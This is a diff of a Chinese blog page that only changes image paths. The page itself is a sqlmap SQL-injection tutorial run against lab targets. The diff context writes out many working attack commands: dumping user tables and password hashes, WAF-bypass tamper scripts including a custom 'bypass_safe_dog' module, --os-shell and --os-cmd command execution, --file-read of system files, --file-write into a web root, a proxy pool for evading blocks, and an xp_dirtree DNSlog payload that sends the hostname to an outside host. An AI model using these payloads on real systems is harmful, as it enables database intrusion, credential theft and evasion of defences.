@@ -503,7 +503,7 @@ python s">
                 <h1 id="sqlmap实战使用"><a href="#sqlmap实战使用" class="headerlink" title="sqlmap实战使用"></a>sqlmap实战使用</h1><p>由浅入深的写下使用</p>
 <span id="more"></span>
 
-<h2 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h2><p><img src="./day33/image-20211109154946308.png" alt="image-20211109154946308"></p>
+<h2 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h2><p><img src="/2021/11/09/day33/image-20211109154946308.png" alt="image-20211109154946308"></p>
 <h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><p>-u 检测的url</p>
 <p>“”双引号 表示这是一段字符串，（存在&amp;符号所以url用引号包起来）</p>
 <p>–dbms 指定攻击的数据库类型</p>
@@ -516,7 +516,7 @@ python s">
 
 <p>程序会自动确认进行SQL注入检测，看到存在注入的参数和攻击payload 也会显示注入的类型 </p>
 <p>可以看到已经给出了结果</p>
-<p><img src="./day33/image-20211109155703694.png" alt="image-20211109155703694"></p>
+<p><img src="/2021/11/09/day33/image-20211109155703694.png" alt="image-20211109155703694"></p>
 <h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>确定存在注入之后，接着通过获取敏感信息命令获取</p>
 <p>–current-user 用户连接的用户</p>
 <p>–currnet-db 当前库</p>
@@ -524,41 +524,41 @@ python s">
 <p>–passwords 获取数据库的密码 使用这个命令 sqlmap找到密文时，会提示你是否进行hash破解 如果需要选择合适的字典。</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 --current-user --current-db --is-dba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109160310326.png" alt="image-20211109160310326"></p>
+<p><img src="/2021/11/09/day33/image-20211109160310326.png" alt="image-20211109160310326"></p>
 <h3 id="获取所有数据库"><a href="#获取所有数据库" class="headerlink" title="获取所有数据库"></a>获取所有数据库</h3><p>–dbs</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109160425714.png" alt="image-20211109160425714"></p>
+<p><img src="/2021/11/09/day33/image-20211109160425714.png" alt="image-20211109160425714"></p>
 <h3 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h3><p>获取表之前我们需要指定数据库，根据库列出表</p>
 <p>-D 库名 指定数据库</p>
 <p>–tables 列出所有表</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109160639868.png" alt="image-20211109160639868"></p>
+<p><img src="/2021/11/09/day33/image-20211109160639868.png" alt="image-20211109160639868"></p>
 <h3 id="获取表的字段"><a href="#获取表的字段" class="headerlink" title="获取表的字段"></a>获取表的字段</h3><p>获取字段之前需要指定库名、表名</p>
 <p>-T 表明 指定表</p>
 <p>–columns 列出所有字段</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109160904975.png" alt="image-20211109160904975"></p>
+<p><img src="/2021/11/09/day33/image-20211109160904975.png" alt="image-20211109160904975"></p>
 <p>也可获取某个库中所有表的字段</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu --tables --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109161016475.png" alt="image-20211109161016475"></p>
+<p><img src="/2021/11/09/day33/image-20211109161016475.png" alt="image-20211109161016475"></p>
 <h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>–dump 是导出数据所有内容</p>
 <p>–dump -C “username,password” 获取某些字段的内容</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users --columns --dump --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>非交互模式下使用的是自带的字典，也可设置字典</p>
-<p><img src="./day33/image-20211109161325611.png" alt="image-20211109161325611"></p>
+<p><img src="/2021/11/09/day33/image-20211109161325611.png" alt="image-20211109161325611"></p>
 <h3 id="获取指定条数"><a href="#获取指定条数" class="headerlink" title="获取指定条数"></a>获取指定条数</h3><p>获取总条数</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users  --count<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109161829802.png" alt="image-20211109161829802"></p>
+<p><img src="/2021/11/09/day33/image-20211109161829802.png" alt="image-20211109161829802"></p>
 <p>获取指定条数  获取1-3条数的数据</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -D pikachu -T users  --dump --start 1 --stop 3 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109161729973.png" alt="image-20211109161729973"></p>
+<p><img src="/2021/11/09/day33/image-20211109161729973.png" alt="image-20211109161729973"></p>
 <h3 id="删除缓存文件"><a href="#删除缓存文件" class="headerlink" title="删除缓存文件"></a>删除缓存文件</h3><p>参数：–flush-session</p>
 <p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p>
 <h3 id="安全的删除output目录的文件"><a href="#安全的删除output目录的文件" class="headerlink" title="安全的删除output目录的文件"></a>安全的删除output目录的文件</h3><p>参数：–purge-output</p>
@@ -590,11 +590,11 @@ Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-r
 <p>信息详细为5回显示user-agent头</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 5 -D pikachu -technique T --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109162915629.png" alt="image-20211109162915629"></p>
+<p><img src="/2021/11/09/day33/image-20211109162915629.png" alt="image-20211109162915629"></p>
 <h3 id="读取文本进行测试"><a href="#读取文本进行测试" class="headerlink" title="读取文本进行测试"></a>读取文本进行测试</h3><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -r 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211109163851223.png" alt="image-20211109163851223"></p>
-<p><img src="./day33/image-20211109163910711.png" alt="image-20211109163910711"></p>
+<p><img src="/2021/11/09/day33/image-20211109163851223.png" alt="image-20211109163851223"></p>
+<p><img src="/2021/11/09/day33/image-20211109163910711.png" alt="image-20211109163910711"></p>
 <p>可以看到吧bp的包放到文件里也成功出结果了</p>
 <h3 id="指定参数进行注入"><a href="#指定参数进行注入" class="headerlink" title="指定参数进行注入"></a>指定参数进行注入</h3><p>-p 指定需要测试的参数</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 -p name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -609,14 +609,14 @@ Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-r
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "10.163.193.76/06/vul/sqli/id/1*.html"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里1就是告诉sqlmap的监测点</p>
-<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p><img src="./day33/image-20211109165023125.png" alt="image-20211109165023125"></p>
+<h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p><img src="/2021/11/09/day33/image-20211109165023125.png" alt="image-20211109165023125"></p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_id.php" --data "id=1&amp;submit=%E6%9F%A5%E8%AF%A2" -p id -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>也能正常出结果</p>
 <h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>–cookie 输入cookie的请求参数</p>
 <p>–level 2或者以上才进行cookie注入</p>
 <p>sqllilabs的less21是cookie注入</p>
-<p><img src="./day33/image-20211109170221436.png" alt="image-20211109170221436"></p>
+<p><img src="/2021/11/09/day33/image-20211109170221436.png" alt="image-20211109170221436"></p>
 <p>我们很自然想到uname作为测试点</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://sql/Less-21/index.php" --cookie "uname = YWRtaW4" -p uname --level 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -624,8 +624,8 @@ Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-r
 <p>默认最大线程是10 可以设置线程最大为100</p>
 <pre class="line-numbers language-none"><code class="language-none">MAX_NUMBER_OF_THREADS = 100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110151137355.png" alt="image-20211110151137355"></p>
-<h3 id="修改默认浏览器"><a href="#修改默认浏览器" class="headerlink" title="修改默认浏览器"></a>修改默认浏览器</h3><p><img src="./day33/image-20211110151417680.png" alt="image-20211110151417680"></p>
+<p><img src="/2021/11/09/day33/image-20211110151137355.png" alt="image-20211110151137355"></p>
+<h3 id="修改默认浏览器"><a href="#修改默认浏览器" class="headerlink" title="修改默认浏览器"></a>修改默认浏览器</h3><p><img src="/2021/11/09/day33/image-20211110151417680.png" alt="image-20211110151417680"></p>
 <h2 id="实战四-绕过防火墙"><a href="#实战四-绕过防火墙" class="headerlink" title="实战四 绕过防火墙"></a>实战四 绕过防火墙</h2><p>目前很多网站都使用waf对网站进行保护，在渗透测试过程中，很多的操作都会被拦截，在测试SQL注入时，waf会对请求过来的流量进行拦截，导致SQLMAP请求的内容无法到达目标，SQLMAP无法判断目标是否存在注入，waf对恶意的攻击请求进行拦截，拦截会拉入黑名单，导致攻击者访问不到目标。无法进行安全检测。</p>
 <p>sqlmap存在tamper模块，我们使用–tamper命令选择合适的脚本绕过waf</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -p name --tamper "space2comment.py" -v 3 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1072,10 +1072,10 @@ Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-r
 <h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -p name --proxy=http://127.0.0.1:8081<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>我们可以在bp上开个端口，让sqlmap的流量经过它</p>
-<p><img src="./day33/image-20211110202014131.png" alt="image-20211110202014131"></p>
+<p><img src="/2021/11/09/day33/image-20211110202014131.png" alt="image-20211110202014131"></p>
 <p>可以看到下图sqlmap的流量过来了</p>
-<p><img src="./day33/image-20211110202024557.png" alt="image-20211110202024557"></p>
-<p><img src="./day33/image-20211110202001149.png" alt="image-20211110202001149"></p>
+<p><img src="/2021/11/09/day33/image-20211110202024557.png" alt="image-20211110202024557"></p>
+<p><img src="/2021/11/09/day33/image-20211110202001149.png" alt="image-20211110202001149"></p>
 <h3 id="使用代理池注入"><a href="#使用代理池注入" class="headerlink" title="使用代理池注入"></a>使用代理池注入</h3><p>购买代理池之后 获取代理 保存到文件内</p>
 <pre class="line-numbers language-none"><code class="language-none">123.73.208.166:46603
 123.73.63.29:46603
@@ -1098,55 +1098,55 @@ Q:InlineSQLInjection(内联注入)<span aria-hidden="true" class="line-numbers-r
 <p>注入点的当前用户是dba时，使用以上两个命令，一个是执行命令，一个是调用交互操作系统shell</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-cmd="net user"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110204445418.png" alt="image-20211110204445418"></p>
+<p><img src="/2021/11/09/day33/image-20211110204445418.png" alt="image-20211110204445418"></p>
 <p>可以看到是SQL server 并且是DBA权限，命令执行成功了</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110204607120.png" alt="image-20211110204607120"></p>
+<p><img src="/2021/11/09/day33/image-20211110204607120.png" alt="image-20211110204607120"></p>
 <p>可以看到弹出了一个交互式shell，可以执行命令，如果可以回显就可以看到返回的命令信息</p>
 <h3 id="读取和写入文件"><a href="#读取和写入文件" class="headerlink" title="读取和写入文件"></a>读取和写入文件</h3><p>–file-read 读取文件 读取文件首先要知道路径,才能读取</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://www.dm1.com/inj.aspx?id=1" -v 1 --file-read="C:/Windows/System32/inetsrv/MetaBase.xml" --threads=10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>C:/Windows/System32/inetsrv/MetaBase.xml 可以换成其他文件路径 如果是linux 可以读取/etc/passwd</p>
-<p><img src="./day33/image-20211110204911803.png" alt="image-20211110204911803"></p>
+<p><img src="/2021/11/09/day33/image-20211110204911803.png" alt="image-20211110204911803"></p>
 <p>读取后的文件在路径给出了</p>
-<p><img src="./day33/image-20211110205040324.png" alt="image-20211110205040324"></p>
+<p><img src="/2021/11/09/day33/image-20211110205040324.png" alt="image-20211110205040324"></p>
 <p>–file-write 写入文件</p>
 <p>–file-write 目标路径 –file-dest 文件路径</p>
 <p>write写本地要写入的文件路径，dest写网站服务器上的文件路径</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm1.com/inj.aspx?id=1" --file-write="C:\Users\Administrator\Desktop\1.txt" --file-dest="C:\Hws.com\HwsHostMaster\wwwroot\dm1.com\web\1.txt"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110205631333.png" alt="image-20211110205631333"></p>
+<p><img src="/2021/11/09/day33/image-20211110205631333.png" alt="image-20211110205631333"></p>
 <p>执行完后发现多了个1.txt</p>
 <h3 id="dnslog盲注"><a href="#dnslog盲注" class="headerlink" title="dnslog盲注"></a>dnslog盲注</h3><p>适合没有回显时，把注入数据发送到远程dnslog上</p>
 <p>–sql-shell 调用sql交互shell，可以执行sql命令</p>
 <pre class="line-numbers language-none"><code class="language-none">declare @s varchar(5000),@host varchar(5000) set @s=(host_name()) set @host=CONVERT(varchar(5000),@s)+'.2kbg3j.dnslog.cn';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110210413131.png" alt="image-20211110210413131"></p>
-<p><img src="./day33/image-20211110210421667.png" alt="image-20211110210421667"></p>
+<p><img src="/2021/11/09/day33/image-20211110210413131.png" alt="image-20211110210413131"></p>
+<p><img src="/2021/11/09/day33/image-20211110210421667.png" alt="image-20211110210421667"></p>
 <p>可以看到hostname拿到了</p>
 <h2 id="实战六"><a href="#实战六" class="headerlink" title="实战六"></a>实战六</h2><h3 id="编写tamper模块绕过waf"><a href="#编写tamper模块绕过waf" class="headerlink" title="编写tamper模块绕过waf"></a>编写tamper模块绕过waf</h3><p>首先我们要判断waf的厂商，新版sqlmap回自动执行waf检测</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110210937332.png" alt="image-20211110210937332"></p>
+<p><img src="/2021/11/09/day33/image-20211110210937332.png" alt="image-20211110210937332"></p>
 <p>在SQL注入中，经常会遇到各种厂商的waf,绕过之后经常手工提交，这样显得特别慢，特别是要注入得到数据的时，手工获取的信息太慢，这个时候可以用编写sqlmap的tamper模块进行注入，自动化进行操作，这样就方便得多了。</p>
 <p>这里是的waf是安全狗</p>
-<p><img src="./day33/image-20211110211346028.png" alt="image-20211110211346028"></p>
+<p><img src="/2021/11/09/day33/image-20211110211346028.png" alt="image-20211110211346028"></p>
 <p>拦截了http user_agent头，我们用–random-agent绕过了</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1 --random-agent --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110211604342.png" alt="image-20211110211604342"></p>
+<p><img src="/2021/11/09/day33/image-20211110211604342.png" alt="image-20211110211604342"></p>
 <p>可以看到出了库，但是当查表时发现sql查询没有返回东西</p>
-<p><img src="./day33/image-20211110211841826.png" alt="image-20211110211841826"></p>
+<p><img src="/2021/11/09/day33/image-20211110211841826.png" alt="image-20211110211841826"></p>
 <p>觉得应该是sql语句的问题，做了拦截</p>
-<p><img src="./day33/image-20211110211927825.png" alt="image-20211110211927825"></p>
+<p><img src="/2021/11/09/day33/image-20211110211927825.png" alt="image-20211110211927825"></p>
 <p>分析得到绕过安全狗的payload</p>
 <pre class="line-numbers language-none"><code class="language-none">--/*%0a这里是你的填写你的注入语句--%20*/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这里的原理</p>
-<p><img src="./day33/image-20211110212907729.png" alt="image-20211110212907729"></p>
+<p><img src="/2021/11/09/day33/image-20211110212907729.png" alt="image-20211110212907729"></p>
 <p>可以看到命令被执行，注释里面的没有执行，我们在*后加个enter符号</p>
-<p><img src="./day33/image-20211110213004444.png" alt="image-20211110213004444"></p>
+<p><img src="/2021/11/09/day33/image-20211110213004444.png" alt="image-20211110213004444"></p>
 <p>可以看到注释里面的东西被执行了</p>
 <p>%0a即回车，我们把注入语句放到里面就会被正常执行了</p>
 <p>写好的tamper模块</p>
@@ -1178,25 +1178,25 @@ def tamper(payload, **kwargs):
         return payload #返回最终的字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们使用它即可绕过iis</p>
-<p><img src="./day33/image-20211110213517121.png" alt="image-20211110213517121"></p>
+<p><img src="/2021/11/09/day33/image-20211110213517121.png" alt="image-20211110213517121"></p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.p2.com/inj.aspx?id=1" -v 1 --random-agent --tamper bypass_safe_dog.py --technique=U -D Angelcms --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110213705450.png" alt="image-20211110213705450"></p>
+<p><img src="/2021/11/09/day33/image-20211110213705450.png" alt="image-20211110213705450"></p>
 <p>可以看到成功绕过了</p>
 <h3 id="暴力穷举"><a href="#暴力穷举" class="headerlink" title="暴力穷举"></a>暴力穷举</h3><p>在access和mysql4.0数据库 没有内置库，针对这类数据库sqlmap使用字典穷举的方法对表进行猜解。</p>
 <p>sqlmap内置的字典</p>
-<p><img src="./day33/image-20211110215513123.png" alt="image-20211110215513123"></p>
+<p><img src="/2021/11/09/day33/image-20211110215513123.png" alt="image-20211110215513123"></p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110220219997.png" alt="image-20211110220219997"></p>
+<p><img src="/2021/11/09/day33/image-20211110220219997.png" alt="image-20211110220219997"></p>
 <p>这里询问字典，1是使用系统自带字典，2为自定义字典</p>
 <p>出来表后我们继续穷举字段</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access -T i_user --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110220658238.png" alt="image-20211110220658238"></p>
+<p><img src="/2021/11/09/day33/image-20211110220658238.png" alt="image-20211110220658238"></p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u "http://www.dm3.com/Content.asp?id=9" --dbms access -T i_user -C "u_id,u_pass,u_user" --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./day33/image-20211110220824329.png" alt="image-20211110220824329"></p>
+<p><img src="/2021/11/09/day33/image-20211110220824329.png" alt="image-20211110220824329"></p>
 
                 
             </div>
